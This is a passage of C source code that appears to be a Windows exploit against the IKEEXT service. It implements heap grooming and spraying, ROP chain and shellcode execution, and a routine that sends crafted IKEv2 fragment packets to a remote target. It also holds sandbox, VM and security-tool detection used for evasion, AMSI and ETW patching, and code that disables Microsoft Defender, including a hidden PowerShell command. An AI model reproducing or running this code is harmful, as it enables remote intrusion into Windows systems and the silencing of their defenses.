        HeapFree(g_ExploitHeap, 0, rop_memory);
        return 0;

    }
    __try {
        ((void(*)())rop_memory)();
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        VirtualProtect(rop_memory, g_RopChain.length * sizeof(uint64_t), old_protect, &old_protect);
        HeapFree(g_ExploitHeap, 0, rop_memory);
        return 0;

    }
    VirtualProtect(rop_memory, g_RopChain.length * sizeof(uint64_t), old_protect, &old_protect);
    HeapFree(g_ExploitHeap, 0, rop_memory);
    return 1;

}

int execute_shellcode(uint8_t* shellcode, size_t shellcode_size) {
    if (!shellcode || shellcode_size == 0) {
        return 0;

    }
    MEMORY_BASIC_INFORMATION mbi;
    if (!VirtualQuery(shellcode, &mbi, sizeof(mbi))) {
        return 0;

    }
    if (!(mbi.Protect & (PAGE_EXECUTE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE))) {
        return 0;

    }
    __try {
        ((void(*)())shellcode)();
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        return 0;

    }
    return 1;

}

int start_heap_grooming(EXPLOIT_CONTEXT* ctx, int thread_count, size_t base_chunk_size, uint64_t target_address) {
    if (!ctx || thread_count <= 0 || thread_count > 32 || base_chunk_size == 0) {
        return 0;

    }
    if (!init_heap_groom_context(ctx, target_address)) {
        return 0;

    }
    g_GroomContext.thread_count = thread_count;
    g_GroomContext.threads = (HANDLE*)malloc(thread_count * sizeof(HANDLE));
    if (!g_GroomContext.threads) {
        return 0;

    }
    memset(g_GroomContext.threads, 0, thread_count * sizeof(HANDLE));
    HEAP_GROOM_THREAD_PARAMS* params = (HEAP_GROOM_THREAD_PARAMS*)malloc(thread_count * sizeof(HEAP_GROOM_THREAD_PARAMS));
    if (!params) {
        free(g_GroomContext.threads);
        g_GroomContext.threads = NULL;
        return 0;

    }
    for (int i = 0; i < thread_count; i++) {
        params[i].heap = g_GroomContext.heap_handle;
        params[i].base_chunk_size = base_chunk_size;
        params[i].iterations = DEFAULT_GROOM_ITERATIONS / thread_count;
        params[i].thread_id = i;
        params[i].stop_flag = &g_GroomContext.stop_flag;
        params[i].target_address = target_address;
        params[i].allocated_chunks = 0;
        params[i].use_nt_allocate = (g_GroomContext.heap_handle == NULL) ? 1 : 0;
        InitializeSRWLock(&params[i].lock);
    }
    for (int i = 0; i < thread_count; i++) {
        g_GroomContext.threads[i] = CreateThread(NULL, 0, ike_heap_groom_thread, &params[i], CREATE_SUSPENDED, NULL);
        if (!g_GroomContext.threads[i]) {
            g_GroomContext.stop_flag = 0;
            for (int j = 0; j < i; j++) {
                if (g_GroomContext.threads[j]) {
                    ResumeThread(g_GroomContext.threads[j]);
                    WaitForSingleObject(g_GroomContext.threads[j], 5000);
                    CloseHandle(g_GroomContext.threads[j]);
                }
            }
            free(g_GroomContext.threads);
            free(params);
            g_GroomContext.threads = NULL;
            return 0;

        }
        SetThreadPriority(g_GroomContext.threads[i], THREAD_PRIORITY_TIME_CRITICAL);
        ResumeThread(g_GroomContext.threads[i]);
    }
    free(params);
    return 1;

}

int stop_heap_grooming() {
    if (!g_GroomContext.stop_flag) {
        return 0;

    }
    g_GroomContext.stop_flag = 0;
    for (int i = 0; i < g_GroomContext.thread_count; i++) {
        if (g_GroomContext.threads[i]) {
            WaitForSingleObject(g_GroomContext.threads[i], 5000);
            CloseHandle(g_GroomContext.threads[i]);
            g_GroomContext.threads[i] = NULL;
        }
    }
    if (g_GroomContext.threads) {
        free(g_GroomContext.threads);
        g_GroomContext.threads = NULL;
    }
    if (g_GroomContext.heap_handle) {
        HeapDestroy(g_GroomContext.heap_handle);
        g_GroomContext.heap_handle = NULL;
    }
    g_GroomContext.thread_count = 0;
    return 1;

}

int init_heap_groom_context(EXPLOIT_CONTEXT* ctx, uint64_t target_address) {
    if (!ctx) {
        return 0;

    }
    memset(&g_GroomContext, 0, sizeof(g_GroomContext));
    g_GroomContext.target_address = target_address;
    g_GroomContext.stop_flag = 1;
    g_GroomContext.heap_handle = NULL;
    return 1;

}

static DWORD WINAPI ike_heap_groom_thread(LPVOID param) {
    HEAP_GROOM_THREAD_PARAMS* params = (HEAP_GROOM_THREAD_PARAMS*)param;
    if (!params) {
        return ERROR_INVALID_PARAMETER;

    }
    HANDLE heap = params->heap;
    size_t base_size = params->base_chunk_size;
    uint32_t iterations = params->iterations;
    uint32_t thread_id = params->thread_id;
    volatile LONG* stop_flag = params->stop_flag;
    uint64_t target_address = params->target_address;
    void** chunks = (void**)malloc(iterations * sizeof(void*));
    if (!chunks) {
        return ERROR_NOT_ENOUGH_MEMORY;

    }
    memset(chunks, 0, iterations * sizeof(void*));
    uint32_t allocated_count = 0;
    srand((unsigned int)time(NULL) ^ thread_id);
    for (uint32_t i = 0; i < iterations && *stop_flag; i++) {
        size_t size = base_size + (rand() % (base_size / 2)) - (base_size / 4);
        if (size < MIN_CHUNK_SIZE) size = MIN_CHUNK_SIZE;
        if (size > MAX_CHUNK_SIZE) size = MAX_CHUNK_SIZE;
        chunks[i] = allocate_ike_chunk(heap, size, i, 1);
        if (!chunks[i]) {
            break;
        }
        if (size >= sizeof(uint64_t)) {
            *(uint64_t*)((uint8_t*)chunks[i] + size - sizeof(uint64_t)) = target_address;
        }
        allocated_count++;
        params->allocated_chunks++;
        Sleep(generate_jitter());
    }
    uint32_t free_pct = MIN_FREE_PERCENTAGE + rand() % (MAX_FREE_PERCENTAGE - MIN_FREE_PERCENTAGE + 1);
    uint32_t free_count = (allocated_count * free_pct) / 100;
    for (uint32_t i = 0; i < free_count && *stop_flag; i++) {
        uint32_t idx = rand() % allocated_count;
        if (chunks[idx]) {
            size_t size = base_size + (rand() % (base_size / 2)) - (base_size / 4);
            if (size < MIN_CHUNK_SIZE) size = MIN_CHUNK_SIZE;
            if (size > MAX_CHUNK_SIZE) size = MAX_CHUNK_SIZE;
            free_ike_chunk(heap, chunks[idx], size);
            chunks[idx] = NULL;
            Sleep(generate_jitter());
        }
    }
    for (uint32_t i = 0; i < allocated_count; i++) {
        if (chunks[i]) {
            size_t size = base_size + (rand() % (base_size / 2)) - (base_size / 4);
            if (size < MIN_CHUNK_SIZE) size = MIN_CHUNK_SIZE;
            if (size > MAX_CHUNK_SIZE) size = MAX_CHUNK_SIZE;
            free_ike_chunk(heap, chunks[i], size);
        }
    }
    free(chunks);
    return 0;

}

int perform_heap_spray(EXPLOIT_CONTEXT* ctx, size_t chunk_size, uint32_t num_chunks, uint64_t shellcode_addr) {
    if (!ctx || chunk_size == 0 || num_chunks == 0 || !shellcode_addr) {
        return 0;

    }
    void** chunks = (void**)malloc(num_chunks * sizeof(void*));
    if (!chunks) {
        return 0;

    }
    memset(chunks, 0, num_chunks * sizeof(void*));
    uint32_t allocated_count = 0;
    srand((unsigned int)time(NULL));
    for (uint32_t i = 0; i < num_chunks; i++) {
        size_t size = chunk_size + (rand() % (chunk_size / 2)) - (chunk_size / 4);
        if (size < MIN_CHUNK_SIZE) size = MIN_CHUNK_SIZE;
        if (size > MAX_CHUNK_SIZE) size = MAX_CHUNK_SIZE;
        chunks[i] = allocate_virtual_chunk(size);
        if (!chunks[i]) {
            continue;
        }
        fill_skf_pattern(chunks[i], size, i, 4);
        if (size >= sizeof(uint64_t)) {
            *(uint64_t*)((uint8_t*)chunks[i] + size - sizeof(uint64_t)) = shellcode_addr;
        }
        allocated_count++;
        Sleep(generate_jitter());
    }
    for (uint32_t i = 0; i < allocated_count; i++) {
        if (chunks[i]) {
            size_t size = chunk_size + (rand() % (chunk_size / 2)) - (chunk_size / 4);
            if (size < MIN_CHUNK_SIZE) size = MIN_CHUNK_SIZE;
            if (size > MAX_CHUNK_SIZE) size = MAX_CHUNK_SIZE;
            free_virtual_chunk(chunks[i], size);
        }
    }
    free(chunks);
    return allocated_count;

}

int perform_rop_heap_spray(EXPLOIT_CONTEXT* ctx, size_t chunk_size, uint32_t num_chunks, uint64_t* rop_chain, size_t chain_length) {
    if (!ctx || chunk_size == 0 || num_chunks == 0 || !rop_chain || chain_length == 0) {
        return 0;

    }
    size_t min_size = chain_length * sizeof(uint64_t) + sizeof(uint64_t) * 2;
    if (chunk_size < min_size) {
        chunk_size = min_size;
    }
    void** chunks = (void**)malloc(num_chunks * sizeof(void*));
    if (!chunks) {
        return 0;

    }
    memset(chunks, 0, num_chunks * sizeof(void*));
    uint32_t allocated_count = 0;
    srand((unsigned int)time(NULL));
    for (uint32_t i = 0; i < num_chunks; i++) {
        size_t size = chunk_size + (rand() % (chunk_size / 2)) - (chunk_size / 4);
        if (size < min_size) size = min_size;
        if (size > MAX_CHUNK_SIZE) size = MAX_CHUNK_SIZE;
        chunks[i] = allocate_virtual_chunk(size);
        if (!chunks[i]) {
            continue;
        }
        memcpy(chunks[i], rop_chain, chain_length * sizeof(uint64_t));
        fill_ike_pattern((uint8_t*)chunks[i] + chain_length * sizeof(uint64_t), size - chain_length * sizeof(uint64_t), i);
        if (size >= chain_length * sizeof(uint64_t) + sizeof(uint64_t)) {
            *(uint64_t*)((uint8_t*)chunks[i] + size - sizeof(uint64_t)) = (uint64_t)chunks[i];
        }
        allocated_count++;
        Sleep(generate_jitter());
    }
    for (uint32_t i = 0; i < allocated_count; i++) {
        if (chunks[i]) {
            size_t size = chunk_size + (rand() % (chunk_size / 2)) - (chunk_size / 4);
            if (size < min_size) size = min_size;
            if (size > MAX_CHUNK_SIZE) size = MAX_CHUNK_SIZE;
            free_virtual_chunk(chunks[i], size);
        }
    }
    free(chunks);
    return allocated_count;

}

int prepare_exploitation(EXPLOIT_CONTEXT* ctx, uint64_t target_address, uint64_t shellcode_addr, uint64_t* rop_chain, size_t chain_length) {
    if (!ctx || !target_address || !shellcode_addr) {
        return 0;

    }
    if (!start_heap_grooming(ctx, DEFAULT_HEAP_GROOM_THREADS, DEFAULT_CHUNK_SIZE, target_address)) {
        return 0;

    }
    Sleep(3000);
    if (!perform_heap_spray(ctx, DEFAULT_CHUNK_SIZE, DEFAULT_SPRAY_ITERATIONS / 2, shellcode_addr)) {
        stop_heap_grooming();
        return 0;

    }
    if (rop_chain && chain_length > 0) {
        if (!perform_rop_heap_spray(ctx, DEFAULT_CHUNK_SIZE, DEFAULT_SPRAY_ITERATIONS / 2, rop_chain, chain_length)) {
            stop_heap_grooming();
            return 0;

        }
    }
    return 1;

}

void cleanup_heap_grooming() {
    stop_heap_grooming();

}

static uint32_t generate_jitter() {
    return JITTER_MIN_MS + (rand() % (JITTER_MAX_MS - JITTER_MIN_MS + 1));

}

static int is_valid_address(uint64_t addr) {
    if (!addr) {
        return 0;

    }
    MEMORY_BASIC_INFORMATION mbi;
    if (!VirtualQuery((LPCVOID)addr, &mbi, sizeof(mbi))) {
        return 0;

    }
    return (mbi.State == MEM_COMMIT);

}

static int is_executable_address(uint64_t addr) {
    if (!addr) {
        return 0;

    }
    MEMORY_BASIC_INFORMATION mbi;
    if (!VirtualQuery((LPCVOID)addr, &mbi, sizeof(mbi))) {
        return 0;

    }
    return (mbi.Protect & (PAGE_EXECUTE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY)) != 0;

}

static uint64_t get_return_address() {
    return (uint64_t)_ReturnAddress();

}

static void* allocate_heap_chunk(HANDLE heap, size_t size, DWORD tag) {
    if (!heap || size == 0) {
        return NULL;

    }
    void* chunk = HeapAlloc(heap, HEAP_ZERO_MEMORY | tag, size);
    if (!chunk) {
        return NULL;

    }
    return chunk;

}

static void free_heap_chunk(HANDLE heap, void* chunk) {
    if (!heap || !chunk) {
        return;

    }
    HeapFree(heap, 0, chunk);

}

static void* allocate_virtual_chunk(size_t size) {
    if (size == 0) {
        return NULL;

    }
    typedef NTSTATUS (NTAPI *PNtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
    PNtAllocateVirtualMemory NtAllocateVirtualMemory = (PNtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
    if (!NtAllocateVirtualMemory) {
        return NULL;

    }
    void* chunk = NULL;
    SIZE_T region_size = size;
    NTSTATUS status = NtAllocateVirtualMemory(GetCurrentProcess(), &chunk, 0, &region_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status != STATUS_SUCCESS) {
        return NULL;

    }
    return chunk;

}

static void free_virtual_chunk(void* chunk, size_t size) {
    if (!chunk) {
        return;

    }
    typedef NTSTATUS (NTAPI *PNtFreeVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG);
    PNtFreeVirtualMemory NtFreeVirtualMemory = (PNtFreeVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtFreeVirtualMemory");
    if (!NtFreeVirtualMemory) {
        return;

    }
    SIZE_T region_size = size;
    NTSTATUS status = NtFreeVirtualMemory(GetCurrentProcess(), &chunk, &region_size, MEM_RELEASE);
    if (status != STATUS_SUCCESS) {
        return;

    }
}

static void fill_pattern(void* buffer, size_t size, uint64_t pattern) {
    if (!buffer || size == 0) {
        return;

    }
    uint8_t* ptr = (uint8_t*)buffer;
    uint64_t* ptr64 = (uint64_t*)buffer;
    size_t i = 0;
    for (; i + sizeof(uint64_t) <= size; i += sizeof(uint64_t)) {
        *ptr64++ = pattern;
    }
    for (; i < size; i++) {
        *ptr++ = (uint8_t)(pattern & 0xFF);
        pattern >>= 8;
    }
}

static void fill_ike_pattern(void* buffer, size_t size, uint32_t fragment_id) {
    if (!buffer || size == 0) {
        return;

    }
    if (size >= sizeof(IKE_HEADER)) {
        IKE_HEADER* header = (IKE_HEADER*)buffer;
        memset(header->init_spi, 0xAA, 8);
        memset(header->resp_spi, 0xBB, 8);
        header->next_payload = PAYLOAD_SKF;
        header->version_major = IKEV2_MAJOR_VERSION;
        header->version_minor = IKEV2_MINOR_VERSION;
        header->exchange_type = IKE_SA_INIT;
        header->flags = 0;
        header->message_id = HTONL(fragment_id);
        header->length = HTONL((uint32_t)size);
    }
    uint64_t pattern = 0x494B4558444F5542 ^ (uint64_t)fragment_id;
    fill_pattern((uint8_t*)buffer + sizeof(IKE_HEADER), size - sizeof(IKE_HEADER), pattern);

}

static void fill_skf_pattern(void* buffer, size_t size, uint32_t fragment_id, uint32_t total_fragments) {
    if (!buffer || size == 0) {
        return;

    }
    if (size >= sizeof(IKE_SKF_FRAGMENT_PAYLOAD)) {
        IKE_SKF_FRAGMENT_PAYLOAD* skf = (IKE_SKF_FRAGMENT_PAYLOAD*)buffer;
        skf->next_payload = PAYLOAD_NONE;
        skf->critical = 1;
        skf->length = HTONS((uint16_t)size);
        skf->fragment_type = SKF_FRAGMENT_TYPE;
        skf->vendor_id = HTONS(NOTIFY_SECURITY_REALM);
        skf->fragment_id = HTONS(fragment_id);
        skf->total_fragments = HTONS(total_fragments);
        skf->fragment_offset = HTONS(fragment_id * (size / total_fragments));
    }
    uint64_t pattern = 0x534B4600534B4600 ^ (uint64_t)fragment_id;
    fill_pattern((uint8_t*)buffer + sizeof(IKE_SKF_FRAGMENT_PAYLOAD), size - sizeof(IKE_SKF_FRAGMENT_PAYLOAD), pattern);

}

static void* allocate_ike_chunk(HANDLE heap, size_t size, uint32_t fragment_id, BOOL use_ike_pattern) {
    void* chunk = NULL;
    if (heap) {
        chunk = allocate_heap_chunk(heap, size, HEAP_TAG_IKE);
    } else {
        chunk = allocate_virtual_chunk(size);
    }
    if (!chunk) {
        return NULL;

    }
    if (use_ike_pattern) {
        fill_ike_pattern(chunk, size, fragment_id);
    } else {
        fill_skf_pattern(chunk, size, fragment_id, 4);
    }
    return chunk;

}

static void free_ike_chunk(HANDLE heap, void* chunk, size_t size) {
    if (!chunk) {
        return;

    }
    if (heap) {
        free_heap_chunk(heap, chunk);
    } else {
        free_virtual_chunk(chunk, size);
    }
}

int is_hostile_environment() {
    if (GetModuleHandleA("sbiedll.dll") || GetModuleHandleA("cuckoo.dll") ||
        GetModuleHandleA("joeboxserver.dll") || GetModuleHandleA("vboxmouse.sys") ||
        GetModuleHandleA("vboxguest.sys") || GetModuleHandleA("vboxsf.sys") ||
        GetModuleHandleA("vboxvideo.sys") || GetModuleHandleA("VBoxService.exe") ||
        GetModuleHandleA("vmhgfs.sys") || GetModuleHandleA("VMToolsHook.dll") ||
        GetModuleHandleA("VMwareTray.exe") || GetModuleHandleA("VMwareService.exe") ||
        GetModuleHandleA("vgauthservice.exe") || GetModuleHandleA("vmsrvc.exe") ||
        GetModuleHandleA("vmtoolsd.exe") || GetModuleHandleA("vmware-hostd.exe")) {
        return 1;

    }
    if (GetModuleHandleA("csagent.exe") || GetModuleHandleA("sentinelagent.exe") ||
        GetModuleHandleA("cbdefense.exe") || GetModuleHandleA("msmpeng.exe") ||
        GetModuleHandleA("avp.exe") || GetModuleHandleA("kavfs.exe") ||
        GetModuleHandleA("bdagent.exe") || GetModuleHandleA("mfehidk.sys") ||
        GetModuleHandleA("mfefire.exe") || GetModuleHandleA("mfemms.exe") ||
        GetModuleHandleA("cyvera.exe") || GetModuleHandleA("CylanceSvc.exe") ||
        GetModuleHandleA("SophosClean.exe") || GetModuleHandleA("SophosSafestore.exe") ||
        GetModuleHandleA("McAfeeFire.exe") || GetModuleHandleA("McShield.exe") ||
        GetModuleHandleA("FSAUA.exe") || GetModuleHandleA("fsau.exe")) {
        return 1;

    }
    PIP_ADAPTER_ADDRESSES pAddresses = NULL;
    ULONG outBufLen = 0;
    if (GetAdaptersAddresses(AF_UNSPEC, 0, NULL, NULL, &outBufLen) == ERROR_BUFFER_OVERFLOW) {
        pAddresses = (PIP_ADAPTER_ADDRESSES)malloc(outBufLen);
        if (pAddresses) {
            if (GetAdaptersAddresses(AF_UNSPEC, 0, NULL, pAddresses, &outBufLen) == NO_ERROR) {
                PIP_ADAPTER_ADDRESSES pCurrAddresses = pAddresses;
                while (pCurrAddresses) {
                    if (pCurrAddresses->PhysicalAddressLength == 6) {
                        uint8_t* mac = pCurrAddresses->PhysicalAddress;
                        if ((mac[0] == 0x00 && mac[1] == 0x0C && mac[2] == 0x29) ||
                            (mac[0] == 0x00 && mac[1] == 0x50 && mac[2] == 0x56) ||
                            (mac[0] == 0x00 && mac[1] == 0x03 && mac[2] == 0xFF) ||
                            (mac[0] == 0x00 && mac[1] == 0x05 && mac[2] == 0x69) ||
                            (mac[0] == 0x00 && mac[1] == 0x16 && mac[2] == 0x3E) ||
                            (mac[0] == 0x00 && mac[1] == 0x1A && mac[2] == 0x4A) ||
                            (mac[0] == 0x00 && mac[1] == 0x1D && mac[2] == 0x0F) ||
                            (mac[0] == 0x08 && mac[1] == 0x00 && mac[2] == 0x27) ||
                            (mac[0] == 0x00 && mac[1] == 0x15 && mac[2] == 0x5D) ||
                            (mac[0] == 0x00 && mac[1] == 0x0D && mac[2] == 0x4B) ||
                            (mac[0] == 0x00 && mac[1] == 0x1C && mac[2] == 0xB8) ||
                            (mac[0] == 0x00 && mac[1] == 0x21 && mac[2] == 0x5A) ||
                            (mac[0] == 0x00 && mac[1] == 0x23 && mac[2] == 0x12) ||
                            (mac[0] == 0x00 && mac[1] == 0x23 && mac[2] == 0xDF)) {
                            free(pAddresses);
                            return 1;

                        }
                    }
                    pCurrAddresses = pCurrAddresses->Next;
                }
            }
            free(pAddresses);
        }
    }
    char hostname[256];
    DWORD hostname_len = sizeof(hostname);
    if (GetComputerNameA(hostname, &hostname_len)) {
        char* lower_hostname = _strlwr(_strdup(hostname));
        if (strstr(lower_hostname, "sandbox") || strstr(lower_hostname, "vmware") ||
            strstr(lower_hostname, "virtual") || strstr(lower_hostname, "vbox") ||
            strstr(lower_hostname, "test") || strstr(lower_hostname, "malware") ||
            strstr(lower_hostname, "analysis") || strstr(lower_hostname, "cuckoo") ||
            strstr(lower_hostname, "joebox") || strstr(lower_hostname, "any.run") ||
            strstr(lower_hostname, "hybrid") || strstr(lower_hostname, "detect")) {
            free(lower_hostname);
            return 1;

        }
        free(lower_hostname);
    }
    char username[256];
    DWORD username_len = sizeof(username);
    if (GetUserNameA(username, &username_len)) {
        char* lower_username = _strlwr(_strdup(username));
        if (strstr(lower_username, "sandbox") || strstr(lower_username, "vmware") ||
            strstr(lower_username, "virtual") || strstr(lower_username, "test") ||
            strstr(lower_username, "user") || strstr(lower_username, "admin") ||
            strstr(lower_username, "analyst") || strstr(lower_username, "research")) {
            free(lower_username);
            return 1;

        }
        free(lower_username);
    }
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors <= 2) {
        return 1;

    }
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    if (GlobalMemoryStatusEx(&memInfo)) {
        if ((double)memInfo.ullAvailPhys / memInfo.ullTotalPhys > 0.9) {
            return 1;

        }
    }
    ULARGE_INTEGER freeBytesAvailable, totalBytes, totalFreeBytes;
    if (GetDiskFreeSpaceExA("C:\\", &freeBytesAvailable, &totalBytes, &totalFreeBytes)) {
        if (totalBytes.QuadPart < 100LL * 1024 * 1024 * 1024) {
            return 1;

        }
    }
    if (GetEnvironmentVariableA("SANDBOX") || GetEnvironmentVariableA("VBOX") ||
        GetEnvironmentVariableA("VMWARE") || GetEnvironmentVariableA("VIRTUAL") ||
        GetEnvironmentVariableA("SAMPLE") || GetEnvironmentVariableA("ANALYSIS") ||
        GetEnvironmentVariableA("MALWARE") || GetEnvironmentVariableA("DETECT") ||
        GetEnvironmentVariableA("CUCKOO") || GetEnvironmentVariableA("JOEBOX")) {
        return 1;

    }
    if (PathFileExistsA("C:\\Sandbox") || PathFileExistsA("C:\\Analysis") ||
        PathFileExistsA("C:\\Sample") || PathFileExistsA("C:\\VMware") ||
        PathFileExistsA("C:\\VirtualBox") || PathFileExistsA("C:\\Tools") ||
        PathFileExistsA("C:\\Malware") || PathFileExistsA("C:\\Detect") ||
        PathFileExistsA("C:\\Cuckoo") || PathFileExistsA("C:\\JoeBox")) {
        return 1;

    }
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hProcessSnap, &pe32)) {
            do {
                char* lower_name = _strlwr(_strdup(pe32.szExeFile));
                if (strstr(lower_name, "sandbox") || strstr(lower_name, "vmware") ||
                    strstr(lower_name, "virtual") || strstr(lower_name, "vbox") ||
                    strstr(lower_name, "cuckoo") || strstr(lower_name, "joebox") ||
                    strstr(lower_name, "wireshark") || strstr(lower_name, "procmon") ||
                    strstr(lower_name, "procexp") || strstr(lower_name, "ida") ||
                    strstr(lower_name, "x64dbg") || strstr(lower_name, "x32dbg") ||
                    strstr(lower_name, "ollydbg") || strstr(lower_name, "debug") ||
                    strstr(lower_name, "fiddler") || strstr(lower_name, "charles") ||
                    strstr(lower_name, "burp") || strstr(lower_name, "mitmproxy") ||
                    strstr(lower_name, "tcpdump") || strstr(lower_name, "tshark")) {
                    free(lower_name);
                    CloseHandle(hProcessSnap);
                    return 1;

                }
                free(lower_name);
            } while (Process32Next(hProcessSnap, &pe32));
        }
        CloseHandle(hProcessSnap);
    }
    return 0;

}

int disable_amsi() {
    HMODULE hAmsi = GetModuleHandleA("amsi.dll");
    if (!hAmsi) {
        return 0;

    }
    typedef HRESULT (WINAPI *AmsiInitialize_t)(LPCWSTR, HAMSICONTEXT*);
    typedef HRESULT (WINAPI *AmsiScanBuffer_t)(HAMSICONTEXT, PVOID, SIZE_T, LPCWSTR, AMSI_RESULT*);
    AmsiScanBuffer_t AmsiScanBuffer = (AmsiScanBuffer_t)GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!AmsiScanBuffer) {
        return 0;

    }
    DWORD oldProtect;
    BYTE patch[] = { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 };
    if (!VirtualProtect((LPVOID)AmsiScanBuffer, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return 0;

    }
    memcpy((LPVOID)AmsiScanBuffer, patch, sizeof(patch));
    VirtualProtect((LPVOID)AmsiScanBuffer, sizeof(patch), oldProtect, &oldProtect);
    return 1;

}

int disable_defender() {
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (SUCCEEDED(hr)) {
        IWSCProduct* pProduct = NULL;
        IWSCProductList* pProductList = NULL;
        hr = CoCreateInstance(__uuidof(WSCProductList), NULL, CLSCTX_INPROC_SERVER, __uuidof(IWSCProductList), (LPVOID*)&pProductList);
        if (SUCCEEDED(hr)) {
            LONG productCount = 0;
            hr = pProductList->Initialize(WSC_SECURITY_PROVIDER_ALL, &productCount);
            if (SUCCEEDED(hr)) {
                for (LONG i = 0; i < productCount; i++) {
                    hr = pProductList->get_Item(i, &pProduct);
                    if (SUCCEEDED(hr)) {
                        WSC_SECURITY_PROVIDER providerType;
                        hr = pProduct->get_ProductType(&providerType);
                        if (SUCCEEDED(hr) && providerType == WSC_SECURITY_PROVIDER_ANTIVIRUS) {
                            hr = pProduct->Set(WSC_SECURITY_PROVIDER_CONTROL, WSC_SECURITY_PROVIDER_DISABLE, 0);
                            if (SUCCEEDED(hr)) {
                                pProduct->Release();
                                pProductList->Release();
                                CoUninitialize();
                                return 1;

                            }
                        }
                        pProduct->Release();
                    }
                }
            }
            pProductList->Release();
        }
        CoUninitialize();
    }
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        DWORD disableRealtime = 1;
        RegSetValueExA(hKey, "DisableRealtimeMonitoring", 0, REG_DWORD, (BYTE*)&disableRealtime, sizeof(disableRealtime));
        RegCloseKey(hKey);
        return 1;

    }
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    char cmd[] = "powershell -WindowStyle Hidden -Command \"Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableScriptScanning $true -DisableOnAccessProtection $true -Force\"";
    if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 1;

    }
    return 0;

}

int disable_etw() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        return 0;

    }
    typedef NTSTATUS (NTAPI *NtTraceControl_t)(TRACEHANDLE, ULONG, PVOID, ULONG, PVOID, ULONG, PULONG);
    NtTraceControl_t NtTraceControl = (NtTraceControl_t)GetProcAddress(hNtdll, "NtTraceControl");
    if (NtTraceControl) {
        for (TRACEHANDLE handle = 0x1000; handle < 0x2000; handle++) {
            NtTraceControl(handle, 0, NULL, 0, NULL, 0, NULL);
        }
        return 1;

    }
    typedef ULONG (WINAPI *EtwEventWrite_t)(REGHANDLE, PCEVENT_DESCRIPTOR, ULONG, ULONG, PVOID, PVOID, PVOID, PVOID);
    EtwEventWrite_t EtwEventWrite = (EtwEventWrite_t)GetProcAddress(hNtdll, "EtwEventWrite");
    if (EtwEventWrite) {
        DWORD oldProtect;
        BYTE patch[] = { 0xC3 };
        if (VirtualProtect((LPVOID)EtwEventWrite, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
            memcpy((LPVOID)EtwEventWrite, patch, sizeof(patch));
            VirtualProtect((LPVOID)EtwEventWrite, sizeof(patch), oldProtect, &oldProtect);
            return 1;

        }
    }
    return 0;

}

int patch_etw() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        return 0;

    }
    typedef ULONG (WINAPI *EtwEventWrite_t)(REGHANDLE, PCEVENT_DESCRIPTOR, ULONG, ULONG, PVOID, PVOID, PVOID, PVOID);
    EtwEventWrite_t EtwEventWrite = (EtwEventWrite_t)GetProcAddress(hNtdll, "EtwEventWrite");
    if (EtwEventWrite) {
        DWORD oldProtect;
        BYTE patch[] = { 0xC3 };
        if (VirtualProtect((LPVOID)EtwEventWrite, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
            memcpy((LPVOID)EtwEventWrite, patch, sizeof(patch));
            VirtualProtect((LPVOID)EtwEventWrite, sizeof(patch), oldProtect, &oldProtect);
            return 1;

        }
    }
    return 0;

}

uint64_t leak_ikeext_address(SOCKET sock, const struct sockaddr_in* target) {
    if (!sock || sock == INVALID_SOCKET || !target) {
        return 0;

    }

    if (is_hostile_environment()) {
        return 0;

    }

    Sleep((RANDOMIZATION_SEED % 1000) + 200);

    uint8_t* packets[SKF_FRAGMENTS + 1] = {0};
    size_t packet_lens[SKF_FRAGMENTS + 1] = {0};
    int num_packets = build_exploit_sequence(packets, packet_lens, SKF_FRAGMENTS + 1);
    if (num_packets == 0) {
        return 0;

    }

    int retries = 0;
    while (retries < MAX_RETRIES) {
        if (send_ike_packet(sock, target, packets[0], packet_lens[0])) {
            break;
        }
        retries++;
        Sleep((RANDOMIZATION_SEED + retries * 0x9E3779B9) % 300 + 100);
    }
    if (retries == MAX_RETRIES) {
        for (int i = 0; i < num_packets; i++) free(packets[i]);
        return 0;

    }
    g_Stats.packets_sent++;

    int fragment_order[SKF_FRAGMENTS];
    for (int i = 0; i < SKF_FRAGMENTS; i++) {
        fragment_order[i] = i + 1;
    }
    for (int i = SKF_FRAGMENTS - 1; i > 0; i--) {
        int j = (RANDOMIZATION_SEED + i) % (i + 1);
        int temp = fragment_order[i];
        fragment_order[i] = fragment_order[j];
        fragment_order[j] = temp;
    }

    for (int i = 0; i < SKF_FRAGMENTS; i++) {
        int fragment_idx = fragment_order[i];
        int fragment_retries = 0;
